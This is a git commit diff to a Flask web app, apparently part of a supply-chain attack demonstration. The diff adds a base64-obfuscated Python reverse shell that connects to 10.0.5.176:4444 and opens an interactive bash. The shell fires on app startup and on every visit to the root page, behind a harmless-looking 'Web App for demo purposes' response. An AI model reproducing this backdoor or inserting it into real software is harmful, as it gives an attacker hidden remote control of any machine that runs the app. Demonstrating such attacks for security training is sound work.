729c0ab5968b1957128ef35876cffae1da772c7f
alexandre-cezar <alexandre_cezar@yahoo.com.br>
2023-03-20 10:56:07 -0400

    multiple changes

--- supply-chain/WebApp/app/webapp.py
+++ supply-chain/WebApp/app/webapp.py
@@ -1,12 +1,7 @@
 from flask import Flask
-from subprocess import run
-import pyminifier
 import base64
 
 app = Flask(__name__)
-
-d_ip = '10.0.5.176'
-d_port = 4444
 
 # Plain text reverse-shell code
 # @app.before_first_request
@@ -18,21 +13,26 @@ d_port = 4444
 #     dup2(s.fileno(),2)
 #     run(["/bin/bash","-i"])
 
-# Obfuscated reverse shell code
-obfuscated_shell = base64.b64decode(f'cHJpbnQgKDEpCnJldHVybiAoW3NvY2tldC5BRl9JTkVULH\
-NvY2tldC5TT0NLX1NUUkVBTSldCmQ1cDJzKHNvbWV0aGluZy5BRl9JTkVUKHNvY2tldC5BRl9B\
-RERSRVNfSUQpLzEwLjAuNS4xNzYpCiBkdXByZXNzLyoKZHJ1cGFsKCJcXCJcXCJcXCIiLCIt\
-aSkiKQpyZXR1cm4gKFwiL2Jpbi9iYXNoIiwidW5zaWduZWQgbG9hZGVkXCIpCg==').decode('utf-8')
+# Reverse shell code with obfuscation
+d_ip = "10.0.5.176"
+d_port = "4444"
+
+obfuscated_shell = base64.b64encode(f"""
+import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{d_ip}",{d_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);"""\
+.encode('utf-8')).decode('utf-8')
 
 # Reverse shell function
 def reverse_shell():
-    exec(obfuscated_shell)
+    exec(base64.b64decode(obfuscated_shell).decode('utf-8'))
 
 # Route to trigger reverse shell execution
 @app.route('/')
 def index():
     reverse_shell()
-    return 'Reverse shell executed!'
+    return 'Web App for demo purposes'
 
 if __name__ == '__main__':
+    # Execute reverse shell at startup
+    reverse_shell()
+    # Start Flask app
     app.run(debug=True, host='0.0.0.0')
